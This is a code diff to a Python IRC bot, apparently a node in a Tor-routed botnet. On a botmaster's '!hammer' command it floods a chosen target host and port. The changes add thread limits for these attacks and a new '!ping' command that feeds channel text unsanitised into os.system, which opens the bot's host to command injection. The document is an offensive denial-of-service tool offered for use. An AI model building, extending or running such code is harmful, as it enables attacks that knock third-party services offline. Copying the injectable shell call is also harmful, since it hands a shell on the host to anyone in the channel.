@@ -6,6 +6,7 @@ import argparse
 import socks
 import socket
 import ssl
+import os
 import time
 import random
 import thread
@@ -35,6 +36,18 @@ art = """
                                   1337 Tor hivemind                       
 """
 
+def okblue(msg):
+    print(bcolors.OKBLUE + msg + bcolors.ENDC)
+
+def okgreen(msg):
+    print(bcolors.OKGREEN + msg + bcolors.ENDC)
+
+def warning(msg):
+    print(bcolors.WARNING + msg + bcolors.ENDC)
+
+def fail(msg):
+    print(bcolors.FAIL + msg + bcolors.ENDC)
+
 global target
 global threads
 global port
@@ -60,13 +73,13 @@ class hammer(threading.Thread):
     def run(self):
         claudiashammer.main(target, int(threads), int(port), False)
 
-print(bcolors.OKBLUE + art + bcolors.ENDC)
+okblue(art)
 time.sleep(1)
 
-version = "0.1.4"
+version = "0.1.5"
 
 print(bcolors.HEADER + "~~ Built up on TorBot. Special thanks to Leet for this awesome code which is so easy to work with. <33333" + bcolors.ENDC)
-print(bcolors.OKBLUE + "v" + version + " see: https://github.com/ClaudiaDAnon/ClaudiaMIND" + bcolors.ENDC)
+okblue("v" + version + " see: https://github.com/ClaudiaDAnon/ClaudiaMIND")
 
 sport = args.port if args.port else raw_input("SOCKS5 port (def. 9050): ")
 if sport == "":
@@ -77,7 +90,7 @@ else:
 native_ip = "0"
 
 if native_ip == "0":
-    print(bcolors.WARNING + "You might want to set your native IP inside the file in order to make this process shorter." + bcolors.ENDC)
+    warning("You might want to set your native IP inside the file in order to make this process shorter.")
     time.sleep(2)
 native_ip = requests.get("http://canihazip.com/s").text
 
@@ -90,17 +103,16 @@ socket.socket = socks.socksocket
 s = socks.socksocket()
 
 
-
 IP = requests.get("http://canihazip.com/s").text
 if IP == native_ip:
     IP = 0
-    print(bcolors.FAIL + "Detected IP leaks." + bcolors.ENDC)
+    fail("Detected IP leaks.")
     time.sleep(2)
 else:
-    print(bcolors.OKGREEN + "No IP leaks detected." + bcolors.ENDC)
+    okgreen("No IP leaks detected.")
     time.sleep(1)
 
-print(bcolors.OKBLUE + "IP: " + IP + bcolors.ENDC)
+okblue("IP: " + IP)
 
 # Setting nicknames and realnames
 
@@ -119,6 +131,9 @@ botmaster = config["botmaster"]
 masterbot = config["masterbot"]
 admins = config["admins"]
 
+minthreads = config["minthreads"]
+maxthreads = config["maxthreads"]
+
 channel = config["channel"]
 
 password = ""
@@ -129,7 +144,7 @@ try:
     s = ssl.wrap_socket(s)
     
 except Exception as e:
-    print(bcolors.FAIL + "Failed to connect. Is TOR running? [" + str(sport) + "]" + bcolors.ENDC)
+    fail("Failed to connect. Is TOR running? [" + str(sport) + "]")
     print(e)
     exit()
 
@@ -141,6 +156,7 @@ s.send("USER " + username + " 0 * :" + realname + "\r\n")
 # Message-sending 
 def message(msg):
     s.send("PRIVMSG " + channel + " :" + msg + "\r\n")
+    print(bcolors.OKGREEN + nickname+" (you): " + bcolors.ENDC + msg)
 
 # Private-Messaging
 def privmessage(user2, msg):
@@ -177,8 +193,7 @@ s.send(":source PRIVMSG " + channel + " :Ahoy, pirate ~" + nickname + "~ has joi
 def take_input(chan, s):
     while 1:
         data = raw_input()
-        send_data = (":source PRIVMSG " + channel + " :" + data + "\r\n")
-        s.send(send_data)
+        message(data)
         
 q = Queue()
 
@@ -235,11 +250,20 @@ while 1:
                     target, threads, port = attackspecs[0]
                     time.sleep(2)
                     threads = int(threads)
+                    if threads < maxthreads:
+                        if threads < minthreads:
+                            threads = minthreads
+                            print("Going with minimum threads (" + str(threads) + ")")
+                            message("Going with minimum threads (" + str(threads) + ")")
+                    else:
+                        threads = maxthreads
+                        print("Going with maximum threads (" + str(threads) + ")")
+                        message("Going with maximum threads (" + str(threads) + ")")
                     port = int(port)
                     attack_hammer = hammer()
                     hammer.start(attack_hammer)
                 except Exception as e:
-                    print(bcolors.FAIL + "Incorrect !hammer format." + bcolors.ENDC)
+                    fail("Incorrect !hammer format.")
                     message("Incorrect !hammer format.")
                     print(e)
         if "!command" in sentmessage:
@@ -249,12 +273,26 @@ while 1:
                 if result[0][0] == nickname or result[0][0] == "*":
                     s.send(result[0][1] + "\r\n")
             except Exception as e:
-                print(bcolors.FAIL + "Incorrect !command format." + bcolors.ENDC)
+                fail("Incorrect !command format.")
                 message("Incorrect !command format.")
                 print(e)
+        if "!ping" in sentmessage:
+                pingdata = sentmessage.replace("!ping ", "")
+                try:
+                    response = os.system("ping -c 1 " + pingdata)
+                    if response == 0:
+                        message(pingdata + " is up for me.")
+                    else:
+                        message(pingdata + " is down for me.")
+                except Exception as e:
+                    fail("Incorrect !ping format.")
+                    message("Incorrect !ping format.")
+                    print(e)
         if sentmessage == "!stop":
             claudiashammer.stop_now = True
             message("Stopping the attack")
             target = None
             threads = None
             port = None
+        if "ACTION pets "+nickname in sentmessage:
+            message("purr")
